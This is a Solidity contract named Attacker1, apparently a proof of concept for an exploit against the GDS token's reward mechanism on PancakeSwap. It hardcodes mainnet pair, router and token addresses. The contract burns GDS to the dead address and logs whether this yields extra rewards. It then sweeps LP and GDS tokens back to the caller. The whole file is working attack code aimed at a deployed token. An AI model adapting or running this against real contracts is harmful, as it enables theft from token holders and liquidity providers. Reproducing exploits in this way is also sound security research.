// SPDX-License-Identifier: MIT

pragma solidity 0.6.12;

import "@openzeppelin/contracts/math/SafeMath.sol";
import "@openzeppelin/contracts/token/ERC20/SafeERC20.sol";
import "../interfaces/IPancakeRouter02.sol";
import "../interfaces/IPancakePair.sol";
import "hardhat/console.sol";

contract Attacker1 {
    using SafeMath for uint256;
    address public PANCAKE_PAIR_GDS_USDC =
        0x4526C263571eb57110D161b41df8FD073Df3C44A;
    address public PANCAKE_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address public GDS_ADDRESS = 0xC1Bb12560468fb255A8e8431BDF883CC4cB3d278;
    address public USDCContractAddress =
        0x55d398326f99059fF775485246999027B3197955;

    function withdraw() public {
        //transfer GDS tokens to dead address and check if rewards are received
        uint256 gdsBalanceBefore = IERC20(GDS_ADDRESS).balanceOf(address(this));
        console.log(
            "GDS balance of this ATTACKER contract before burning 10000 gds",
            gdsBalanceBefore
        );
        IERC20(GDS_ADDRESS).transfer(
            0x000000000000000000000000000000000000dEaD,
            10000
        );
        uint256 gdsBalanceAfter = IERC20(GDS_ADDRESS).balanceOf(address(this));
        console.log(
            "GDS balance of this ATTACKER contract after burning 10000 gds",
            gdsBalanceAfter
        );
       console.log("GDS REWARDS RECEIVED: ", gdsBalanceAfter.sub(gdsBalanceBefore));

        //transfer lp tokens back to user
        IPancakePair(PANCAKE_PAIR_GDS_USDC).transfer(
            msg.sender,
            IPancakePair(PANCAKE_PAIR_GDS_USDC).balanceOf(address(this))
        );
        //transfer gds tokens back to user
        IERC20(GDS_ADDRESS).transfer(
            msg.sender,
            IERC20(GDS_ADDRESS).balanceOf(address(this))
        );
    }

    function transferToken() public {
        address[] memory routerAddress = new address[](2);
        routerAddress[0] = USDCContractAddress;
        routerAddress[1] = GDS_ADDRESS;
        uint256[] memory amounts = IPancakeRouter02(PANCAKE_ROUTER)
            .getAmountsOut(1e20, routerAddress);

        //transfer GDS tokens to the dead address
        IERC20(GDS_ADDRESS).transfer(
            0x000000000000000000000000000000000000dEaD,
            amounts[1]
        );
    }
}
